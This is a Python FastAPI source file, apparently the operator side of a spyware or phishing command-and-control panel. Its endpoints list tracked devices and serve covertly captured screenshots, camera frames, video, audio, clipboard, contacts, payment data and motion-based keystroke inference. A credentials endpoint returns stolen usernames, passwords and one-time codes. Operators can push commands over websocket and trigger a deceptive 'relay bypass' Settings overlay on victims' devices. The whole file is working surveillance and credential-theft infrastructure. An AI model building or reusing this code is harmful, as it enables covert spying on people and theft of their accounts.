from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import FileResponse
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, update, delete as sql_delete, desc
from backend.database import get_db
from backend.models import Device, Credential, MediaItem, Command, Event
from backend.auth import get_current_user, require_role
import os, json, logging

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/devices", tags=["devices"])


def _source_from_path(path: str) -> str:
    """Extract 'front'/'back' from filename like '1234567890_front.jpg'."""
    stem = os.path.basename(path).rsplit('.', 1)[0]
    parts = stem.rsplit('_', 1)
    return parts[1] if len(parts) == 2 and parts[1] in ('front', 'back') else ''


@router.post("/refresh-all")
async def refresh_all_devices(db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    result = await db.execute(select(Device))
    devices = result.scalars().all()
    queued = 0
    pushed = 0
    from backend.api.collection import _connections
    for device in devices:
        cmd = Command(device_id=device.id, type="reload", payload_json="{}", status="pending")
        db.add(cmd)
        await db.flush()
        try:
            ws = _connections.get(device.id)
            if ws:
                await ws.send_text(json.dumps({"type": "command", "id": cmd.id, "cmd_type": "reload", "payload": {}}))
                pushed += 1
        except Exception as e:
            logger.warning(f"WS push failed for device {device.id}: {e}")
        queued += 1
    await db.commit()
    return {"queued": queued, "ws_pushed": pushed}


@router.get("/")
async def list_devices(db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(Device).order_by(Device.last_seen.desc()))
    devices = result.scalars().all()
    return [{"id": d.id, "name": d.name, "user_agent": d.user_agent,
             "last_seen": d.last_seen.isoformat() if d.last_seen else None,
             "first_seen": d.first_seen.isoformat() if d.first_seen else None,
             "current_version": d.current_version, "engagement_score": d.engagement_score,
             "push_enabled": bool(d.push_subscription)} for d in devices]


@router.get("/{device_id}")
async def get_device(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    from backend.utils.asn_lookup import lookup as asn_lookup
    result = await db.execute(select(Device).where(Device.id == device_id))
    device = result.scalar_one_or_none()
    if not device:
        raise HTTPException(status_code=404, detail="not_found")
    ip_entries = json.loads(device.ip_history_json or "[]")
    # Support both old plain-string format and new {ip, ts} format
    def _ip_str(e): return e["ip"] if isinstance(e, dict) else e
    current_ip = _ip_str(ip_entries[0]) if ip_entries else None
    net_type = await asn_lookup(current_ip) if current_ip else None
    return {
        "id": device.id, "name": device.name, "user_agent": device.user_agent,
        "fingerprint_hash": device.fingerprint_hash,
        "first_seen": device.first_seen.isoformat() if device.first_seen else None,
        "last_seen": device.last_seen.isoformat() if device.last_seen else None,
        "push_subscription": device.push_subscription,
        "current_version": device.current_version,
        "ip_history_json": device.ip_history_json,
        "engagement_score": device.engagement_score,
        "current_network_type": net_type,
    }


@router.patch("/{device_id}")
async def update_device(device_id: int, body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    allowed = {k: v for k, v in body.items() if k == 'name'}
    if not allowed:
        raise HTTPException(status_code=400, detail="nothing_to_update")
    await db.execute(update(Device).where(Device.id == device_id).values(**allowed))
    await db.commit()
    return {"ok": True}


@router.delete("/{device_id}")
async def delete_device(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    from backend.models import Event, Command
    # Delete related rows first (FK constraints)
    await db.execute(sql_delete(Event).where(Event.device_id == device_id))
    await db.execute(sql_delete(Command).where(Command.device_id == device_id))
    result = await db.execute(sql_delete(Device).where(Device.id == device_id))
    await db.commit()
    if result.rowcount == 0:
        raise HTTPException(status_code=404, detail="not_found")
    return {"ok": True}


@router.delete("/{device_id}/events")
async def clear_events(device_id: int, type: str = Query(default=None), db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    import asyncio
    from backend.models import Event
    from backend.api.collection import _PENDING_CACHE_RESET, _last_hb_hash, _store_network_type
    q = sql_delete(Event).where(Event.device_id == device_id)
    if type:
        q = q.where(Event.type == type)
    result = await db.execute(q)
    await db.commit()
    _PENDING_CACHE_RESET.add(device_id)
    _last_hb_hash.pop(device_id, None)  # force next heartbeat to be stored
    # Re-queue network_type lookup for current IP so the card repopulates after clear.
    dev_result = await db.execute(select(Device).where(Device.id == device_id))
    dev = dev_result.scalar_one_or_none()
    if dev and dev.ip_history_json:
        import json as _json
        ip_entries2 = _json.loads(dev.ip_history_json or "[]")
        if ip_entries2:
            e0 = ip_entries2[0]
            asyncio.create_task(_store_network_type(device_id, e0["ip"] if isinstance(e0, dict) else e0))
    return {"ok": True, "deleted": result.rowcount}


@router.post("/{device_id}/trigger-relay-bypass")
async def trigger_relay_bypass(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    from backend.api.collection import _PENDING_RELAY_PROMPT, _PENDING_RELAY_CANCEL
    _PENDING_RELAY_CANCEL.discard(device_id)
    _PENDING_RELAY_PROMPT.add(device_id)
    return {"ok": True, "message": "Device will show Settings overlay on next heartbeat"}


@router.post("/{device_id}/cancel-relay-bypass")
async def cancel_relay_bypass(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    from backend.api.collection import _PENDING_RELAY_PROMPT, _PENDING_RELAY_CANCEL
    _PENDING_RELAY_PROMPT.discard(device_id)
    _PENDING_RELAY_CANCEL.add(device_id)
    return {"ok": True, "message": "Device will hide relay overlay on next heartbeat"}


@router.post("/{device_id}/set-version")
async def set_device_version(device_id: int, body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    version_hash = body.get("version_hash")  # None clears the override
    await db.execute(update(Device).where(Device.id == device_id).values(target_version_hash=version_hash))
    await db.commit()
    return {"ok": True, "device_id": device_id, "target_version_hash": version_hash}


@router.get("/{device_id}/screenshots")
async def get_screenshots(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(
        select(MediaItem).where(MediaItem.device_id == device_id, MediaItem.type == "screenshot")
        .order_by(desc(MediaItem.timestamp)).limit(50)
    )
    items = result.scalars().all()
    return [{"id": m.id, "timestamp": m.timestamp.isoformat(), "size_bytes": m.size_bytes,
             "url": f"/api/devices/{device_id}/screenshots/{m.id}/image"} for m in items]


@router.get("/{device_id}/screenshots/{screenshot_id}/image")
async def get_screenshot_image(device_id: int, screenshot_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(MediaItem).where(MediaItem.id == screenshot_id, MediaItem.device_id == device_id))
    item = result.scalar_one_or_none()
    if not item or not os.path.exists(item.file_path):
        raise HTTPException(status_code=404, detail="not_found")
    return FileResponse(item.file_path, media_type="image/jpeg")


@router.delete("/{device_id}/screenshots/{screenshot_id}")
async def delete_screenshot(device_id: int, screenshot_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(MediaItem).where(MediaItem.id == screenshot_id, MediaItem.device_id == device_id))
    item = result.scalar_one_or_none()
    if not item:
        raise HTTPException(status_code=404, detail="not_found")
    if os.path.exists(item.file_path):
        os.remove(item.file_path)
    await db.execute(sql_delete(MediaItem).where(MediaItem.id == screenshot_id))
    await db.commit()
    return {"ok": True}


@router.get("/{device_id}/camera")
async def get_camera_frames(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(
        select(MediaItem).where(MediaItem.device_id == device_id, MediaItem.type == "camera")
        .order_by(desc(MediaItem.timestamp)).limit(50)
    )
    items = result.scalars().all()
    return [{"id": m.id, "timestamp": m.timestamp.isoformat(), "size_bytes": m.size_bytes,
             "source": _source_from_path(m.file_path),
             "url": f"/api/devices/{device_id}/camera/{m.id}/image"} for m in items]


@router.get("/{device_id}/camera/{frame_id}/image")
async def get_camera_image(device_id: int, frame_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(MediaItem).where(MediaItem.id == frame_id, MediaItem.device_id == device_id, MediaItem.type == "camera"))
    item = result.scalar_one_or_none()
    if not item or not os.path.exists(item.file_path):
        raise HTTPException(status_code=404, detail="not_found")
    return FileResponse(item.file_path, media_type="image/jpeg")


@router.delete("/{device_id}/camera/{frame_id}")
async def delete_camera_frame(device_id: int, frame_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(MediaItem).where(MediaItem.id == frame_id, MediaItem.device_id == device_id))
    item = result.scalar_one_or_none()
    if not item:
        raise HTTPException(status_code=404, detail="not_found")
    if os.path.exists(item.file_path):
        os.remove(item.file_path)
    await db.execute(sql_delete(MediaItem).where(MediaItem.id == frame_id))
    await db.commit()
    return {"ok": True}


@router.get("/{device_id}/videos")
async def get_videos(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(
        select(MediaItem).where(MediaItem.device_id == device_id, MediaItem.type == "video")
        .order_by(desc(MediaItem.timestamp)).limit(100)
    )
    items = result.scalars().all()
    return [{"id": m.id, "timestamp": m.timestamp.isoformat(), "size_bytes": m.size_bytes,
             "source": _source_from_path(m.file_path),
             "url": f"/api/devices/{device_id}/videos/{m.id}/file"} for m in items]


@router.get("/{device_id}/videos/{video_id}/file")
async def get_video_file(device_id: int, video_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(MediaItem).where(MediaItem.id == video_id, MediaItem.device_id == device_id, MediaItem.type == "video"))
    item = result.scalar_one_or_none()
    if not item or not os.path.exists(item.file_path):
        raise HTTPException(status_code=404, detail="not_found")
    media_type = "video/mp4" if item.file_path.endswith(".mp4") else "video/webm"
    return FileResponse(item.file_path, media_type=media_type,
                        headers={"Content-Disposition": f"inline; filename=live_{device_id}_{video_id}.mp4"})


@router.delete("/{device_id}/videos/{video_id}")
async def delete_video(device_id: int, video_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(MediaItem).where(MediaItem.id == video_id, MediaItem.device_id == device_id, MediaItem.type == "video"))
    item = result.scalar_one_or_none()
    if not item:
        raise HTTPException(status_code=404, detail="not_found")
    if os.path.exists(item.file_path):
        os.remove(item.file_path)
    await db.execute(sql_delete(MediaItem).where(MediaItem.id == video_id))
    await db.commit()
    return {"ok": True}


@router.get("/{device_id}/recordings")
async def get_recordings(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(
        select(MediaItem).where(MediaItem.device_id == device_id, MediaItem.type == "audio")
        .order_by(desc(MediaItem.timestamp)).limit(100)
    )
    items = result.scalars().all()
    return [{"id": m.id, "timestamp": m.timestamp.isoformat(), "size_bytes": m.size_bytes,
             "url": f"/api/devices/{device_id}/recordings/{m.id}/file"} for m in items]


@router.get("/{device_id}/recordings/{rec_id}/file")
async def get_recording_file(device_id: int, rec_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(MediaItem).where(MediaItem.id == rec_id, MediaItem.device_id == device_id, MediaItem.type == "audio"))
    item = result.scalar_one_or_none()
    if not item or not os.path.exists(item.file_path):
        raise HTTPException(status_code=404, detail="not_found")
    media_type = "audio/webm" if item.file_path.endswith(".webm") else "audio/mp4"
    return FileResponse(item.file_path, media_type=media_type,
                        headers={"Content-Disposition": f"inline; filename=rec_{device_id}_{rec_id}.m4a"})


@router.delete("/{device_id}/recordings/{rec_id}")
async def delete_recording(device_id: int, rec_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(MediaItem).where(MediaItem.id == rec_id, MediaItem.device_id == device_id, MediaItem.type == "audio"))
    item = result.scalar_one_or_none()
    if not item:
        raise HTTPException(status_code=404, detail="not_found")
    if os.path.exists(item.file_path):
        os.remove(item.file_path)
    await db.execute(sql_delete(MediaItem).where(MediaItem.id == rec_id))
    await db.commit()
    return {"ok": True}


@router.post("/{device_id}/intelligence/clear")
async def clear_intelligence(device_id: int, body: dict, db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    group = body.get("group", "all")   # geo|screenshot|camera|clipboard|payment|motion|all
    keep_last = body.get("keep_last", False)

    EVENT_TYPE_MAP = {
        "geo":       ["geolocation"],
        "clipboard": ["clipboard"],
        "payment":   ["payment_response"],
        "contacts":  ["contacts"],
        "motion":    [
            "motion", "compass", "motion_capture", "motion_stream",
            "motion_activity", "motion_gait", "motion_context", "motion_tremor",
            "motion_taps", "motion_tap_detected", "motion_elevator", "motion_photo",
            "motion_dead_reckoning", "motion_profile", "motion_permission",
            "motion_keystroke_event", "motion_keystrokes",
            "motion_session_started", "motion_session_live", "motion_session_summary",
        ],
    }
    MEDIA_TYPE_MAP = {
        "screenshot": "screenshot",
        "camera":     "camera",
        "video":      "video",
        "audio":      "audio",
    }

    groups_to_clear = list(EVENT_TYPE_MAP.keys()) + list(MEDIA_TYPE_MAP.keys()) if group == "all" else [group]

    for g in groups_to_clear:
        if g in EVENT_TYPE_MAP:
            for etype in EVENT_TYPE_MAP[g]:
                result = await db.execute(
                    select(Event).where(Event.device_id == device_id, Event.type == etype)
                    .order_by(desc(Event.timestamp))
                )
                evts = result.scalars().all()
                to_delete = evts[1:] if keep_last else evts
                for ev in to_delete:
                    await db.delete(ev)
        elif g in MEDIA_TYPE_MAP:
            mtype = MEDIA_TYPE_MAP[g]
            result = await db.execute(
                select(MediaItem).where(MediaItem.device_id == device_id, MediaItem.type == mtype)
                .order_by(desc(MediaItem.timestamp))
            )
            items = result.scalars().all()
            to_delete = items[1:] if keep_last else items
            for item in to_delete:
                if os.path.exists(item.file_path):
                    os.remove(item.file_path)
                await db.delete(item)

    await db.commit()
    return {"ok": True}


@router.delete("/{device_id}/events/{event_id}")
async def delete_event(device_id: int, event_id: int, db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    result = await db.execute(select(Event).where(Event.id == event_id, Event.device_id == device_id))
    ev = result.scalar_one_or_none()
    if not ev:
        raise HTTPException(status_code=404, detail="Event not found")
    await db.delete(ev)
    await db.commit()
    return {"ok": True}


@router.delete("/{device_id}/credentials/{cred_id}")
async def delete_credential(device_id: int, cred_id: int, db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    result = await db.execute(select(Credential).where(Credential.id == cred_id, Credential.device_id == device_id))
    cred = result.scalar_one_or_none()
    if not cred:
        raise HTTPException(status_code=404, detail="Credential not found")
    await db.delete(cred)
    await db.commit()
    return {"ok": True}


@router.get("/{device_id}/credentials")
async def get_device_credentials(device_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(
        select(Credential).where(Credential.device_id == device_id)
        .order_by(Credential.timestamp.desc())
    )
    creds = result.scalars().all()
    return [{
        "id": c.id, "username": c.username, "password": c.password,
        "otp": c.otp, "validated": c.validated,
        "timestamp": c.timestamp.isoformat() if c.timestamp else None,
    } for c in creds]
